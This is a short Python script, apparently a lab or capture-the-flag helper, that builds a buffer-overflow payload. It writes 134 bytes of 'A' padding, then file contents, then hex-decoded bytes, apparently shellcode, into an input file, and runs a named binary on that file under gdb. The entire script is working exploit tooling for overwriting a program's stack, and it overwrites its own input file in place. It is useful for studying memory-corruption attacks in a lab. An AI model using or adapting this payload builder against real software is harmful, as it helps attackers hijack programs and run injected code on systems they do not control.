import sys
import os
if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Error: missing required arguments")
    else:
        f = open(sys.argv[2], "rb")
        b = bytearray(f.read())
        b = b[:len(b)-1]
        f2 = open(sys.argv[3], "rb")
        b2 = bytearray(f2.read())
        b2 = b2[:len(b2)-1]
        b3 = bytearray()
        f2.close()
        for i in range(0,len(b2),4):
            b3.append((int(chr(b2[i+2]),base=16)<<4)+int(chr(b2[i+3]),base=16))
        f.close()
        fie = open(sys.argv[2], "wb")
        s="A"*134
        b1 = bytearray(s)
        b1.extend(b)
        b1.extend(b3)
        fie.write(b1+b'\n')
        fie.close()
        k=os.popen("echo \'run < "+sys.argv[2]+"\' | gdb ./"+sys.argv[1]).read()
        #fie = open(sys.argv[2], "wb")
        #fie.write(b+b'\n')
        print(k)
